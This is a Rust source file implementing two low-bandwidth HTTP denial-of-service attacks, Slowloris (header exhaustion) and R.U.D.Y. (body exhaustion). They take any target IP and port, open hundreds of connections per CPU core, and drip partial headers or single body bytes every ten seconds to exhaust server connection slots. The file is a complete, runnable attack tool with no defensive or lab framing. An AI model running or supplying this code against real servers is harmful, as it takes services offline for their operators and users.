use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;
use tokio::time::{Duration, Instant};
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
// use std::sync::Arc;

// 2.A "Slowloris" (Header Exhaustion)
pub async fn slowloris(target_ip: &str, target_port: u16, duration_secs: u64) {
    let start_time = Instant::now();
    let target = format!("{}:{}", target_ip, target_port);
    let mut handles = vec![];
    
    // Low and Slow -> High connection count, low bandwidth.
    // Try to open 1000 connections per thread?
    // OS Limits apply.
    let max_conn = 500; 

    for _ in 0..num_cpus::get() {
        let t_clone = target.clone();
        handles.push(tokio::spawn(async move {
            let mut streams = Vec::new();
            
            while start_time.elapsed().as_secs() < duration_secs {
                // Replenish connections
                while streams.len() < max_conn {
                    if let Ok(mut stream) = TcpStream::connect(&t_clone).await {
                        // Send partial header
                        let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
                        let _ = stream.write_all(b"Host: localhost\r\n").await;
                        let _ = stream.write_all(b"User-Agent: Mozilla/5.0...\r\n").await;
                        // Don't send \r\n\r\n
                        streams.push(stream);
                    } else {
                        break; // Target limit reached or refuse
                    }
                }
                
                // Keep-alive: Send 1 header line every 10s
                let mut active_streams = Vec::new();
                for mut stream in streams {
                    // Send random header: "X-Rand: 1"
                    let mut rng = StdRng::from_entropy();
                    let header = format!("X-{}: {}\r\n", rng.gen::<u32>(), rng.gen::<u32>());
                    if stream.write_all(header.as_bytes()).await.is_ok() {
                        active_streams.push(stream);
                    }
                }
                streams = active_streams;
                
                tokio::time::sleep(Duration::from_secs(10)).await;
            }
        }));
    }
    for h in handles { let _ = h.await; }
}

// 2.B "R.U.D.Y." (Body Exhaustion)
pub async fn rudy(target_ip: &str, target_port: u16, duration_secs: u64) {
    let start_time = Instant::now();
    let target = format!("{}:{}", target_ip, target_port);
    let mut handles = vec![];
    let max_conn = 500;

    for _ in 0..num_cpus::get() {
        let t_clone = target.clone();
        handles.push(tokio::spawn(async move {
            let mut streams = Vec::new();
            
            while start_time.elapsed().as_secs() < duration_secs {
                while streams.len() < max_conn {
                    if let Ok(mut stream) = TcpStream::connect(&t_clone).await {
                        // Post Header with Huge Content-Length
                        let headers = "POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";
                        if stream.write_all(headers.as_bytes()).await.is_ok() {
                             streams.push(stream);
                        }
                    } else {
                        break;
                    }
                }

                // Drip feed 1 byte
                let mut active_streams = Vec::new();
                for mut stream in streams {
                    if stream.write_all(b"A").await.is_ok() {
                         active_streams.push(stream);
                    }
                }
                streams = active_streams;

                tokio::time::sleep(Duration::from_secs(10)).await;
            }
        }));
    }
    for h in handles { let _ = h.await; }
}
